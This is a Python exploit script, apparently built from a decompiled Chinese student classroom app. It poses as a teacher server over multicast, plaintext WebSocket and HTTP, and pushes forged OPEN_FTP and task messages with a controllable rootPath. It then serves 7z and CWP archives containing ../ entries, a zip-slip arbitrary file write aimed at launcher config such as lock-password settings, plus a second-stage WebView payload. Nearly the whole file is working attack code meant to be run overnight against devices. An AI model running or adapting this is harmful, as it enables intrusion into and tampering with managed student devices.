#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""fake_classroom.py — 模拟教师端（伪教室服务），全自动链路。

代码依据（全来自反编译 云课堂学生 com.xh.smartclassstu）:
  MultiCastClient:  listenerIp="239.0.0.50"  INTERCEPTION_PORT=0x2712(10002!)  SEND_PORT=0x1f93(8083)
  MultiCastClient$1: new MulticastSocket(10002) + joinGroup(239.0.0.50) + receive()
                     => 收到内容后回调 listener.getData(content) / dataHasChange(content)
                     => 并回 ACK "已经收到Ip" 到组播:8083
  MultiCastServer:  new MulticastSocket(8083) + getSendContent() => 发到 239.0.0.50
  IpGetUtil:        getDefaultWsLocalIp() = "ws://" + <local ip> + ":8088"   (明文 WebSocket!)
  TeacherWebSocketHelper: 起"本地服务器"(ws://<ip>:8088) + "上报老师的ip地址"
  FtpManager.addParam:  {"hostName":ip,"port":FTP_PORT,"rootPath":SHARE_PATH,"downloadWaitTime":3,"startLimitRate":0.015}
  FtpManager.sendOneStuStatus: SocketMessage{messageType:0xC351(OPEN_FTP_CODE) 或 0xC352(CLOSE), dataString:上面JSON}
  StuFtpManager$1: 收到后 => downloadFromTeacher(...) => startDownload(savePath=rootPath拼出来的!,...)
                   => XHDownloadProxy.createOkHttp().setUrl(ftpUrl/idcUrl).setSavePath(savePath) => 落盘
  => rootPath 由"教师"下发、无过滤 => 路径穿越 => 任意文件写

本脚本做四件事:
  ① 组播探测: 向 239.0.0.50:10002 与 :8083 发内容, 观察是否有 ACK("已经收到Ip")
  ② 起 ws://0.0.0.0:8088 (纯 Python 实现 RFC6455, 无第三方依赖), 记录任何连入
  ③ 连入后下发 OPEN_FTP_CODE 消息(SocketMessage JSON), 其中 hostName=本机  rootPath=可穿越路径
  ④ 同时起一个 HTTP 服务(默认 8080) 供端侧下载"载荷文件"(会被写到 rootPath 指定的位置)

用法:
  python fake_classroom.py probe           # 只发组播探测
  python fake_classroom.py serve           # 起 WS + HTTP, 等学生连入
  python fake_classroom.py run             # 两者都做(推荐, 通宵跑)
环境变量:
  OWN_IP(默认 192.168.137.1) WS_PORT(8088) HTTP_PORT(8080)
  ROOT_PATH(默认穿越到 shared_prefs) PAYLOAD_FILE(默认 payload.xml)
"""
import base64
import hashlib
import json
import os
import socket
import struct
import sys
import threading
import time
import datetime

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "classroom.log")
SENT = os.path.join(BASE, "classroom_sent.txt")

GROUP = "239.0.0.50"
PORT_LISTEN = 10002      # 学生端监听端口 (MultiCastClient INTERCEPTION_PORT = 0x2712)
PORT_SEND = 8083         # 服务器发送端口 (MultiCastServer)
WS_PORT = int(os.environ.get("WS_PORT", "8088"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "8080"))
OWN_IP = os.environ.get("OWN_IP", "192.168.137.1")

OPEN_FTP_CODE = 0xC351      # 50001
# HTTP+Auth 轮询计数(按次数轮换 messageType, 避免端侧按内容去重后静默忽略)
_HTTP_POLL_N = 0
_HTTP_POLL_LOCK = threading.Lock()
CLOSE_FTP_CODE = 0xC352     # 50002

# 目标落盘路径（rootPath 会被拼成 address + rootPath + "/" + str + "/" + str2）
# getFileUrl(str, str2) = address + rootPath + sep + str + sep + str2
# 因此把 rootPath 设成带 ../ 的路径即可穿越。
#
# ★ 2026-10-07 13:45 落点选择依据:
#   端侧应用**只能写**自己沙箱(/data/data/<自身包名> 或 /sdcard/Android/data/<自身包名>)与 /sdcard 公共区;
#   写别的应用私有目录会被系统拒绝。而：
#     /sdcard/xuehai/config/...  ← 启动器**会读**的共享配置目录(微服务表/管控配置)
#     /sdcard/xuehai/keep/...    ← provider.ini(is_need_input_lock_password) 等
#   两者都在公共区 ⇒ 端侧可写, 且能被启动器消费。
#   取 ROOT_PATH=/sdcard/xuehai/share: 下载物落在 .../share/<p1>/<p2>,
#   而载荷内 ../ 深度 3~11 的条目正好向上越出到 /sdcard(/ → sdcard/xuehai/keep/...) ⇒ 与设计匹配。
ROOT_PATH = os.environ.get("ROOT_PATH", "/sdcard/xuehai/share")


def wlog(msg):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S"), msg)
    try:
        with open(LOG, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\n")
    except Exception:
        pass
    print(line, flush=True)


# ---------------- ① 组播 ----------------
def multicast_send(content, ports=(PORT_LISTEN, PORT_SEND), group=GROUP, repeat=5):
    """向组播组发送内容（同时打学生监听端口与服务器端口）。"""
    sent = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(OWN_IP))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1)
            data = content.encode() if isinstance(content, str) else content
            for _ in range(repeat):
                s.sendto(data, (group, port))
                time.sleep(0.15)
            s.close()
            sent.append(port)
            wlog("[MC-SEND] -> %s:%d  content=%r (%d bytes x%d)" % (group, port, content[:120], len(data), repeat))
        except Exception as e:
            wlog("[MC-SEND-ERR] %s:%d -> %s" % (group, port, e))
    return sent


def multicast_listen(seconds=30, ports=(PORT_LISTEN, PORT_SEND)):
    """监听组播, 抓学生端的 ACK("已经收到Ip")或其它响应。"""
    socks = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except Exception:
                pass
            s.bind(("", port))
            mreq = struct.pack("4sl", socket.inet_aton(GROUP), socket.INADDR_ANY)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
            s.settimeout(1.0)
            socks.append((port, s))
            wlog("[MC-LISTEN] 已加入组 %s:%d" % (GROUP, port))
        except Exception as e:
            wlog("[MC-LISTEN-ERR] %d -> %s" % (port, e))
    t0 = time.time()
    while time.time() - t0 < seconds:
        for port, s in socks:
            try:
                data, addr = s.recvfrom(2048)
                txt = data.decode("utf-8", "replace")
                wlog("!!!!!! [MC-RECV] from %s:%d -> %r" % (addr[0], addr[1], txt[:200]))
                if "已经收到Ip" in txt or "Ip" in txt:
                    wlog("!!!!!! [MC-ACK] \u2605\u2605\u2605 \u5b66\u751f\u7aef\u54cd\u5e94\u4e86\uff01(说明\u5b83\u5728\u76d1\u542c\u7ec4\u64ad!)")
            except socket.timeout:
                pass
            except Exception as e:
                wlog("[MC-RECV-ERR] %s" % e)
    for _, s in socks:
        try:
            s.close()
        except Exception:
            pass


# ---------------- ② 极简 WebSocket 服务 (RFC6455) ----------------
def ws_handshake(conn):
    """完成 WS 握手, 返回 True/False。兼容 Java-WebSocket:
       - 回显 Sec-WebSocket-Protocol(若客户端请求)
       - 支持 Sec-WebSocket-Extensions 的忽略处理
       - 大小写不敏感的头解析"""
    try:
        conn.settimeout(15)
        buf = b""
        while b"\r\n\r\n" not in buf:
            c = conn.recv(4096)
            if not c:
                return False
            buf += c
        req = buf.decode("latin-1", "replace")
        first = req.split("\r\n")[0]
        headers = {}
        for line in req.split("\r\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()
        key = headers.get("sec-websocket-key")
        if not key:
            # ★ 非 WS: 实测设备的 IM 通道就是"明文 HTTP + Auth 头"(GET / HTTP/1.1 + Auth:{boundId,role})
            #   这里完整记录请求原文(取证/学协议), 并回一个合法 HTTP 应答, 免得应用长时间挂住。
            wlog("!!!!!! [HTTP-ON-WS-PORT] %s | \u5934=%s" % (first[:140], list(headers.keys())))
            wlog("[HTTP-ON-WS-PORT-RAW] %s" % req.replace("\r\n", " | ")[:900])
            try:
                # ★ 关键改进(2026-10-07 12:20): 这条"HTTP + Auth"通道就是端侧的 IM/教室轮询,
                #   直接把 **OPEN_FTP_CODE 信封**(ServerMessage 外层 + SocketMessage 内层 type=50001)
                #   作为应答回给它 —— 端侧 StuFtpManager 收到即 downloadFromTeacher(...)
                #   (rootPath 可控 ⇒ ZIP-SLIP 越界写), 不必等 WS 通道。
                # ★ 2026-10-07 13:20: 按轮询次数轮换 messageType, 避免端侧按内容去重后静默忽略:
                #   每 3 次里 2 次下 OPEN_FTP(下载触发, 核心), 1 次下 cmd=11(老师上线, 进入课堂态)。
                global _HTTP_POLL_N
                with _HTTP_POLL_LOCK:
                    _HTTP_POLL_N += 1
                    n = _HTTP_POLL_N
                if n % 3 == 0:
                    env = {"cmd": 11, "ct": "", "from": "teacher", "gt": 0, "cId": "",
                           "smsg": build_socket_message(OPEN_FTP_CODE)}
                    tag = "cmd=11 老师上线"
                else:
                    env = {"cmd": 0, "ct": "", "from": "teacher", "gt": 0, "cId": "",
                           "smsg": build_socket_message(OPEN_FTP_CODE)}
                    tag = "cmd=0 OPEN_FTP"
                _b = json.dumps(env, ensure_ascii=False).encode("utf-8")
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\n"
                             + ("Content-Length: %d\r\n" % len(_b)).encode()
                             + b"Connection: close\r\n\r\n" + _b)
                wlog("!!!!!! [HTTP-ON-WS-PORT-REPLY#%d] %s (%dB) hostName=%s port=%s rootPath=%s" % (
                    n, tag, len(_b), OWN_IP, HTTP_PORT, ROOT_PATH))
            except Exception as _e:
                wlog("[HTTP-ON-WS-PORT-ERR] %s" % _e)
            return False
        path = first.split(" ")[1] if " " in first else "/"
        accept = base64.b64encode(hashlib.sha1((key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode()).digest()).decode()
        resp = ("HTTP/1.1 101 Switching Protocols\r\n"
                "Upgrade: websocket\r\n"
                "Connection: Upgrade\r\n"
                "Sec-WebSocket-Accept: %s\r\n" % accept)
        # ★ 子协议回显(Java-WebSocket 会校验!)
        proto = headers.get("sec-websocket-protocol")
        if proto:
            first_proto = proto.split(",")[0].strip()
            resp += "Sec-WebSocket-Protocol: %s\r\n" % first_proto
            wlog("[WS] \u56de\u663e\u5b50\u534f\u8bae: %s" % first_proto)
        resp += "\r\n"
        conn.sendall(resp.encode())
        wlog("!!!!!! [WS-OPEN] \u5ba2\u6237\u7aef\u5df2\u63e1\u624b path=%s UA=%s proto=%s" % (
            path, headers.get("user-agent", "?")[:60], proto))
        return True
    except Exception as e:
        wlog("[WS-HS-ERR] %s" % e)
        return False


def ws_send_text(conn, text):
    """发送一个文本帧（服务端不掩码）。"""
    data = text.encode("utf-8")
    header = bytearray([0x81])
    n = len(data)
    if n < 126:
        header.append(n)
    elif n < 65536:
        header.append(126)
        header += struct.pack(">H", n)
    else:
        header.append(127)
        header += struct.pack(">Q", n)
    conn.sendall(bytes(header) + data)
    wlog("[WS-SEND] \u2192 %d bytes: %s" % (n, text[:300]))


def ws_recv_frame(conn):
    """读取一帧（支持文本/二进制/ping/pong/close）。返回 (opcode, payload) 或 None。"""
    try:
        conn.settimeout(30)
        hdr = conn.recv(2)
        if len(hdr) < 2:
            return None
        b1, b2 = hdr[0], hdr[1]
        opcode = b1 & 0x0F
        masked = b2 & 0x80
        ln = b2 & 0x7F
        if ln == 126:
            ln = struct.unpack(">H", conn.recv(2))[0]
        elif ln == 127:
            ln = struct.unpack(">Q", conn.recv(8))[0]
        mask = conn.recv(4) if masked else None
        payload = b""
        while len(payload) < ln:
            c = conn.recv(ln - len(payload))
            if not c:
                break
            payload += c
        if mask:
            payload = bytes(x ^ mask[i % 4] for i, x in enumerate(payload))
        return opcode, payload
    except Exception:
        return None


def handle_ws_client(conn, addr):
    if not ws_handshake(conn):
        try:
            conn.close()
        except Exception:
            pass
        return
    wlog("!!!!!! [WS-CLIENT] \u2605\u2605\u2605 \u6709\u8bbe\u5907\u8fde\u5165: %s:%d" % (addr[0], addr[1]))
    # 先读一会儿（看客户端是否主动发消息: 可能是它的 join/hello!）
    t0 = time.time()
    got = False
    while time.time() - t0 < 6:
        fr = ws_recv_frame(conn)
        if fr is None:
            break
        op, pl = fr
        if op == 0x8:
            wlog("[WS-CLOSE] %s:%d" % addr)
            break
        if op == 0x9:
            conn.sendall(bytes([0x8A, 0]))
            continue
        if op in (0x1, 0x2):
            got = True
            try:
                txt = pl.decode("utf-8", "replace")
            except Exception:
                txt = repr(pl[:200])
            wlog("!!!!!! [WS-RECV] from %s:%d -> %s" % (addr[0], addr[1], txt[:400]))
            # ★ 心跳: 端侧 parser 对纯文本 "ping"/"pong" 直接 return(HandleSocketMsgService:222-236)
            #   学生端 keepalive 会发 ping, 服务端应回 pong 维持通道
            if txt.strip().lower() in ("ping", "pong", "heartbeat", "keepalive"):
                try:
                    ws_send_text(conn, "pong")
                    wlog("[WS-PONG] -> %s:%d" % (addr[0], addr[1]))
                except Exception as e:
                    wlog("[WS-PONG-ERR] %s" % e)
    # 无论是否收到, 都推 OPEN_FTP_CODE
    push_open_ftp(conn)
    # ★ 再推"消息矩阵"(任务/PPT资源推送候选), 覆盖自动下载触发链
    try:
        push_battery(conn)
    except Exception as e:
        wlog("[BATTERY-FAIL] %s" % e)
    # 保持连接并继续读
    t0 = time.time()
    while time.time() - t0 < 300:
        fr = ws_recv_frame(conn)
        if fr is None:
            break
        op, pl = fr
        if op == 0x8:
            break
        if op in (0x1, 0x2):
            _txt = pl.decode("utf-8", "replace")
            wlog("[WS-RECV] %s:%d -> %s" % (addr[0], addr[1], _txt[:400]))
            if _txt.strip().lower() in ("ping", "pong", "heartbeat", "keepalive"):
                try:
                    ws_send_text(conn, "pong")
                    wlog("[WS-PONG] -> %s:%d" % (addr[0], addr[1]))
                except Exception as e:
                    wlog("[WS-PONG-ERR] %s" % e)
    try:
        conn.close()
    except Exception:
        pass
    wlog("[WS-END] %s:%d \u65ad\u5f00" % addr)


def build_socket_message(msg_type=OPEN_FTP_CODE):
    """按 SocketMessage 的真实字段名构造(Gson 用字段名做 JSON 键!):
       classRoomId / createTag / data / forward / senderId / type / userIds
    data 里放 FtpManager.addParam 的 JSON: hostName/port/rootPath/downloadWaitTime/startLimitRate

    ★ 2026-10-07 01:00 代码级确证(HandleSocketMsgService.onHandleIntent):
      真正的线上格式是 **ServerMessage** 外层信封, 内层 smsg 是 SocketMessage **对象**:
        ServerMessage 字段 = cmd(I) / ct(String) / from(String) / gt(I) / smsg(SocketMessage) / cId(String)
      解析流程:
        239  GsonUtil.fromJson(ServerMessage.class, msg)
        253  ct   = sm.getCt()
        258  smsg = sm.getSmsg()
        262-271  if (smsg == null) smsg = GsonUtil.fromJson(SocketMessage.class, ct)   // ★ ct 可作字符串回退!
        280-301  if (gt == 1 && isStudent) -> StudentWebSocketHelper.sendSureMsg(cId)  // 需要 ACK
        303-372  cmd==11 老师上线 / cmd==10 老师下线 / cmd==6,7 特殊分支(避开!)
        375+     cmd 其它值 -> 继续按 smsg 处理
      心跳: 222-236 收到字符串 "ping"/"pong" 直接 return(纯文本心跳)
    """
    payload = {
        "hostName": OWN_IP,
        "port": HTTP_PORT,
        "rootPath": ROOT_PATH,
        "downloadWaitTime": 3,
        "startLimitRate": 0.014999999664723873,
    }
    return {
        "classRoomId": os.environ.get("CLASS_ID", "UXHOVJJF"),
        "createTag": "default_tag",
        "data": json.dumps(payload, ensure_ascii=False),
        "forward": 0,
        "senderId": 0,
        "type": msg_type,                    # ★ 真字段名是 type(不是 messageType!)
        "userIds": os.environ.get("USER_IDS", "2112229"),
    }


def push_battery(conn):
    """★ 消息矩阵: 覆盖"任务推送/PPT资源推送"等候选类型 × 候选 JSON。

    依据(代码级):
      * 自动下载触发链: 任务/PPT推送 -> TaskDetail/PptProgressBean -> AutoDownloadManager
        -> ResourceDownloader -> ResourceHelper.downLoadResource -> downloadFromTeacher(从我们下载)
        -> 下载成功 -> Z7Extractor.extractFile (libun7zip.so, 无路径校验!) -> 任意写
      * onMsgEvent 识别的动作: action_socket_create_new_task / action_socket_download_ppt_resource
      * ISocketCode 候选类型: 0x0=CREATE_NEW_TASK, 0x4=SYNC_PPT, 0x5=PPT_HAS_ENTRY,
        0x44e=SWITCH_PPT_TYPE, 0x64/0x68/0x69/0x75=附件材料族, 0x12d/0x25c/0x276/0xbb9/0xbbf/0xfa1=分发器已见
    策略: 全部下发(端侧分发器会自行路由识别得了的那条), 用日志看哪条命中。
    """
    cid = os.environ.get("CLASS_ID", "UXHOVJJF")
    uid = os.environ.get("USER_IDS", "2112229")
    base = "http://%s:%d" % (OWN_IP, HTTP_PORT)
    files = {"url": base + "/lab.7z", "fileUrl": base + "/lab.7z",
             "downloadUrl": base + "/lab.7z", "resourceUrl": base + "/lab.7z",
             "path": base + "/lab.7z", "sourceUrl": base + "/lab.7z"}

    def task_detail(**kw):
        d = {"taskId": "LAB_T1", "subTaskId": "LAB_S1", "taskType": 1, "itemType": 1,
             "taskStatus": 1, "pptSource": 1, "deskTopId": "", "resourceId": "LAB_R1",
             "resourceType": 1, "viewedIds": "", "viewedNum": 0, "originTotalNumber": 1,
             "docHomeworkTaskVo": "{}", "classroomStageContent": "", "teaUserId": 1,
             "userId": int(uid) if str(uid).isdigit() else 0}
        d.update(kw)
        d.update(files)
        return json.dumps(d, ensure_ascii=False)

    def ppt_bean(**kw):
        d = {"resourceId": "LAB_R1", "taskId": "LAB_T1", "subTaskId": "LAB_S1",
             "deskTopId": "", "status": 1, "resourceType": 1, "taskStatus": 1,
             "isSync": True, "isAutoSyn": True, "teaAreaHeight": 100, "teaAreaWidth": 100,
             "teaScaleSize": 1.0, "wordsGroupId": "", "taskType": 1, "itemType": 1}
        d.update(kw)
        d.update(files)
        return json.dumps(d, ensure_ascii=False)

    PAYLOADS = [
        task_detail(),
        ppt_bean(),
        ppt_bean(isSync=False),
        json.dumps(dict({"name": "lab.7z", "type": ".7z", "size": 2720}, **files), ensure_ascii=False),
        json.dumps(files, ensure_ascii=False),
        json.dumps([dict(files, resourceId="LAB_R1", taskId="LAB_T1")], ensure_ascii=False),
        "{}",
    ]
    TYPES = [0x0, 0x4, 0x5, 0x64, 0x68, 0x69, 0x75, 0x44E, 0x12D, 0x25C, 0x276,
             0xBB9, 0xBBF, 0xFA1, 0x2C7, 0x2715]
    cid_base = {"cmd": 0, "from": "teacher", "gt": 0, "cId": cid}
    n = 0
    for t in TYPES:
        for pl in PAYLOADS:
            smsg = {"classRoomId": cid, "createTag": "default_tag", "data": pl,
                    "forward": 0, "senderId": 0, "type": t, "userIds": uid}
            try:
                ws_send_text(conn, json.dumps(dict(cid_base, ct="", smsg=smsg), ensure_ascii=False))
                with open(SENT, "a", encoding="utf-8") as f:
                    f.write("[battery type=0x%x] %s\n" % (t, pl[:200]))
                n += 1
                time.sleep(0.08)
            except Exception as e:
                wlog("[BATTERY-ERR] %s" % e)
                return
    wlog("!!!!!! [BATTERY] \u5df2\u4e0b\u53d1 %d \u6761\u5019\u9009\u6d88\u606f (type x payload)" % n)


def push_open_ftp(conn):
    """按代码级确证的真实信封下发 OPEN_FTP_CODE。

    变体顺序(按可能性):
      ① ServerMessage{smsg: <SocketMessage 对象>}          <- 主路径(239/258)
      ② ServerMessage{ct: "<SocketMessage JSON 字符串>"}    <- 回退路径(262-271)
      ③ Bare SocketMessage                                 <- 兜底
      ④ ServerMessage{smsg: <别名内层>}                     <- 兜底
    cmd 用 0(避开 6/7/10/11 的特殊分支), gt=0, cId 给 classRoomId。
    """
    smsg = build_socket_message()
    smsg_alt = dict(smsg)
    smsg_alt["messageType"] = smsg["type"]
    smsg_alt["dataString"] = smsg["data"]
    cid = os.environ.get("CLASS_ID", "UXHOVJJF")
    base = {"cmd": 0, "ct": "", "from": "teacher", "gt": 0, "cId": cid}
    variants = [
        # ① 主路径: smsg 为对象
        json.dumps(dict(base, smsg=smsg), ensure_ascii=False),
        # ② 回退路径: ct 为 SocketMessage 的 JSON 字符串
        json.dumps(dict(base, ct=json.dumps(smsg, ensure_ascii=False)), ensure_ascii=False),
        # ③ 裸 SocketMessage
        json.dumps(smsg, ensure_ascii=False),
        # ④ smsg 为别名内层
        json.dumps(dict(base, smsg=smsg_alt), ensure_ascii=False),
    ]
    for v in variants:
        try:
            ws_send_text(conn, v)
            with open(SENT, "a", encoding="utf-8") as f:
                f.write(v + "\n")
            time.sleep(0.6)
        except Exception as e:
            wlog("[WS-SEND-ERR] %s" % e)


def ws_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", WS_PORT))
    srv.listen(16)
    wlog("[WS-UP] 伪教室服务已启动 ws://0.0.0.0:%d (明文!)" % WS_PORT)
    while True:
        try:
            conn, addr = srv.accept()
            wlog("[WS-ACCEPT] 新连接 %s:%d" % addr)
            threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            wlog("[WS-ACCEPT-ERR] %s" % e)


# 额外端口: 教室/Basket 服务可能用的端口(表里给什么就用什么, 这里全部占上!)
#   ★ 8887/8889/8886 = 实测设备 IM/推送连接的端口(明文 HTTP + Auth 头)
#   ★ 8106 = com.xh.arespunc 配置口; 3200 = 历史注册口; 10000+ = 云课堂内置文件共享
EXTRA_PORTS = [int(x) for x in os.environ.get(
    "EXTRA_WS_PORTS",
    "8088,8083,8081,8082,8084,8085,8010,8090,9090,8888,8887,8889,8886,8106,3200,"
    "10000,10001,10002,10003,81,82,83,84,85,86,87,88,89,90"
).split(",") if x.strip()]


def ws_server_on(port):
    """在额外端口上跑同样的伪教室逻辑(相同消息)。"""
    if port == WS_PORT:
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(16)
        wlog("[WS-UP+] 附加端口监听 ws://0.0.0.0:%d" % port)
    except Exception as e:
        wlog("[WS-UP+SKIP] %d -> %s" % (port, e))
        return
    while True:
        try:
            conn, addr = srv.accept()
            wlog("!!!!!! [WS-ACCEPT+] \u2605 %s:%d -> \u672c\u673a:%d" % (addr[0], addr[1], port))
            threading.Thread(target=handle_ws_client, args=(conn, addr), daemon=True).start()
        except Exception as e:
            wlog("[WS-ACCEPT+-ERR] %s" % e)


# ---------------- ③ HTTP 载荷服务 ----------------
def http_server():
    """提供 /<任何路径> 都返回载荷文件（模拟"教师机的文件共享"!）。"""
    payload = os.path.join(BASE, os.environ.get("PAYLOAD_FILE", "payload.xml"))
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", HTTP_PORT))
    srv.listen(32)
    wlog("[HTTP-UP] \u8f7d\u8377\u670d\u52a1\u5df2\u542f\u52a8 http://0.0.0.0:%d (\u4efb\u4f55\u8def\u5f84\u90fd\u8fd4\u56de %s)" % (HTTP_PORT, payload))

    while True:
        try:
            conn, addr = srv.accept()
            data = b""
            conn.settimeout(5)
            try:
                while b"\r\n\r\n" not in data:
                    c = conn.recv(4096)
                    if not c:
                        break
                    data += c
            except Exception:
                pass
            reqline = data.split(b"\r\n")[0].decode("latin-1", "replace") if data else ""
            # ★ CWP-ZIPSLIP: 若请求路径里出现 .cwp，返回"恶意 CWP"(实为含 ../ 条目的 ZIP)
            #   依据: InteractionCwpDownloadAndUnZipHelper.downLoadCwp 只要求 url 以 .cwp 结尾;
            #         下载主机 = 我们的 hostName(OPEN_FTP_CODE 控制) ⇒ 内容由我们决定;
            #         解压走 UnZipCwpUtil$2 -> com.xuehai.zhitongyun7za.ZhitongyunCwpTools.UncompressCwp
            #         (原生 7-Zip, 调用方无 "../" 检查)。
            _req = reqline.split(" ")[1] if " " in reqline else ""
            _cwp = os.path.join(BASE, "payload_malicious.cwp")
            _s7z = os.path.join(BASE, "payload_slip.7z")
            _rl = _req.lower()
            _st2 = os.path.join(BASE, "payload_stage2.7z")
            if "stage2" in _rl and os.path.exists(_st2):
                body = open(_st2, "rb").read()
                wlog("!!!!!! [STAGE2-SERVE] from %s:%d \u5bf9 %s \u4e0b\u53d1 WebView \u4e8c\u7ea7\u8f7d\u8377 (%dB)"
                     % (addr[0], addr[1], _req[:90], len(body)))
            elif ".7z" in _rl and os.path.exists(_s7z):
                body = open(_s7z, "rb").read()
                wlog("!!!!!! [7Z-SERVE] from %s:%d \u5bf9 %s \u4e0b\u53d1\u6076\u610f .7z (%dB, \u542b ../ \u6761\u76ee!)"
                     % (addr[0], addr[1], _req[:100], len(body)))
            elif ".cwp" in _rl and os.path.exists(_cwp):
                body = open(_cwp, "rb").read()
                wlog("!!!!!! [CWP-SERVE] from %s:%d \u5bf9 %s \u4e0b\u53d1\u6076\u610f .cwp (%dB, \u542b ../ \u6761\u76ee!)"
                     % (addr[0], addr[1], _req[:100], len(body)))
            elif ".xml" in _rl and os.path.exists(payload):
                body = open(payload, "rb").read()
            elif os.path.exists(_s7z):
                # ★ 2026-10-07 12:25 修复: 教室 FTP 下载路径由 getFileUrl(p1,p2) 拼出 ——
                #   address + rootPath + "/" + p1 + "/" + p2, **不带扩展名**!
                #   此前会落到默认 payload.xml(170B) ⇒ 端侧拿到的是 XML 而非 7z, 越界写无从发生。
                #   8080 的唯一消费者就是教室 FTP 下载 ⇒ 默认给 ZIP-SLIP 载荷。
                body = open(_s7z, "rb").read()
                wlog("!!!!!! [FTP-7Z-SERVE] from %s:%d \u5bf9 %s \u4e0b\u53d1 ZIP-SLIP \u8f7d\u8377 (%dB, \u542b ../ \u6761\u76ee)"
                     % (addr[0], addr[1], _req[:110], len(body)))
            elif os.path.exists(payload):
                body = open(payload, "rb").read()
            else:
                body = b"<payload-not-found/>"
            hdr = ("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
                   "Content-Length: %d\r\nConnection: close\r\n\r\n" % len(body)).encode()
            conn.sendall(hdr + body)
            conn.close()
            if ".cwp" not in _req.lower():
                wlog("!!!!!! [HTTP-GET] from %s:%d  %s  -> \u8fd4\u56de\u8f7d\u8377 %dB  (\u2605\u82e5\u8fd9\u662f\u5b66\u751f\u7aef, \u5b83\u4f1a\u628a\u5b83\u5199\u5230 rootPath \u6307\u5b9a\u7684\u4f4d\u7f6e!)"
                     % (addr[0], addr[1], reqline[:110], len(body)))
        except Exception as e:
            wlog("[HTTP-ERR] %s" % e)


def main():
    cmd = sys.argv[1] if len(sys.argv) > 1 else "run"
    wlog("===== fake_classroom \u542f\u52a8: mode=%s OWN_IP=%s WS=%d HTTP=%d =====" % (cmd, OWN_IP, WS_PORT, HTTP_PORT))
    wlog("      ROOT_PATH=%s" % ROOT_PATH)
    if cmd == "probe":
        content = os.environ.get("MC_CONTENT", "ws://%s:%d" % (OWN_IP, WS_PORT))
        threading.Thread(target=multicast_listen, args=(40,), daemon=True).start()
        time.sleep(1)
        for i in range(6):
            multicast_send(content)
            time.sleep(3)
        time.sleep(40)
        return
    # run / serve
    threading.Thread(target=ws_server, daemon=True).start()
    threading.Thread(target=http_server, daemon=True).start()
    # 额外端口(教室/Basket 服务可能用的端口!)
    for p in EXTRA_PORTS:
        threading.Thread(target=ws_server_on, args=(p,), daemon=True).start()
    if cmd == "run":
        def probe_loop():
            content_variants = [
                "ws://%s:%d" % (OWN_IP, WS_PORT),
                "%s:%d" % (OWN_IP, WS_PORT),
                json.dumps({"ip": OWN_IP, "port": WS_PORT, "wsUrl": "ws://%s:%d" % (OWN_IP, WS_PORT)},
                           ensure_ascii=False),
            ]
            while True:
                for c in content_variants:
                    multicast_send(c, repeat=3)
                time.sleep(20)
        threading.Thread(target=probe_loop, daemon=True).start()
    while True:
        time.sleep(60)
        wlog("[ALIVE] \u7b49\u5f85\u8bbe\u5907\u8fde\u5165 (ws://%s:%d) ..." % (OWN_IP, WS_PORT))


if __name__ == "__main__":
    main()
